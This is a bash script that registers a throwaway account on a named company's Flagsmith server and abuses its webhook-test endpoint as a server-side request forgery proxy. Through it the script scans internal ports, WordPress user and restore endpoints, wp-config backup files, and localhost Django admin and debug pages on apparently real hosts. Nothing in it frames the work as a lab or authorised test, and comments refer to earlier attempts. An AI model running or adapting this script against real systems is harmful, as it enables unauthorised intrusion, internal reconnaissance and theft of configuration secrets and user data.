#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
IP=$(curl -s https://ifconfig.me --max-time 5)
echo "IP: $IP"

# Register fresh Flagsmith account
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"email\":\"kw-v32-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "Key: $KEY"
if [ -z "$KEY" ]; then echo "REG FAILED: $ACCT"; exit 1; fi

# Setup - get existing org or create
OID=$(curl -s "https://flagsmith.koinworks.com/api/v1/organisations/" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10 | python3 -c "import json,sys; d=json.load(sys.stdin); r=d.get('results',[]); print(r[0]['id'] if r else '')" 2>/dev/null)
if [ -z "$OID" ]; then
  OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d '{"name":"v32"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
fi
echo "Org: $OID"

# Create project and environment
PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"p\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"e\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
echo "Env: $EKEY"
if [ -z "$EKEY" ]; then echo "ENV CREATION FAILED"; exit 1; fi

ssrf() {
  local URL="$1"
  local LABEL="$2"
  local R=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$URL\",\"secret\":\"\"}" --max-time 45)
  echo "$LABEL -> $R"
}

echo "=== PORT 9090 PROTOCOLS ==="
# Port 9090 was TCP open (504 on HTTP POST earlier)
# Could be: Prometheus, Grafana, Cockpit, management tool
# Try various protocols/paths

# Try GET-like paths (SSRF sends POST but redirects work)
ssrf "http://koinp2p.com:9090/" "9090-root"
ssrf "http://koinp2p.com:9090/metrics" "9090-metrics"
ssrf "http://koinp2p.com:9090/api/v1/status/config" "9090-prom-api"
ssrf "http://koinp2p.com:9090/-/healthy" "9090-prom-healthy"
ssrf "http://koinp2p.com:9090/api/v1/query?query=up" "9090-prom-query"
ssrf "http://koinp2p.com:9090/graph" "9090-graph"
ssrf "http://koinp2p.com:9090/targets" "9090-targets"

# Node Exporter (9100)
ssrf "http://koinp2p.com:9100/metrics" "9100-metrics"

echo "=== KOINP2P CRITICAL RETRY ==="
# Retry critical endpoints that errored in v30 (with fresh account)
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=heartbeat" "heartbeat"
ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_ajaxrestore&updraftplus_ajax_restore=start_ajax_restore" "updraft-restore"
ssrf "http://koinp2p.com/wp-json/wp/v2/users" "rest-users"
ssrf "http://koinp2p.com/wp-json/" "rest-root"
ssrf "http://koinp2p.com/readme.html" "readme"

echo "=== WP-CONFIG BACKUP ==="
ssrf "http://koinp2p.com/wp-config.php.bak" "config-bak"
ssrf "http://koinp2p.com/.wp-config.php.swp" "config-swp"

echo "=== DJANGO INTERNAL ADMIN ==="
ssrf "http://localhost:8000/admin/" "django-admin"
ssrf "http://localhost:8000/admin/login/" "django-login"
ssrf "http://localhost:8000/api/v1/organisations/" "orgs-internal"
ssrf "http://localhost:8000/__debug__/" "debug-toolbar"
ssrf "http://localhost:8000/silk/" "silk-profiler"

echo "=== INTERNAL SERVICES SCAN ==="
# Scan common ports on koinp2p.com internal
for port in 8080 8443 3000 4000 5000 6000 7000 8000 8888 9200 9300 11211 27017 15672; do
  ssrf "http://koinp2p.com:${port}/" "koinp2p-${port}"
done

echo "=== DONE ==="
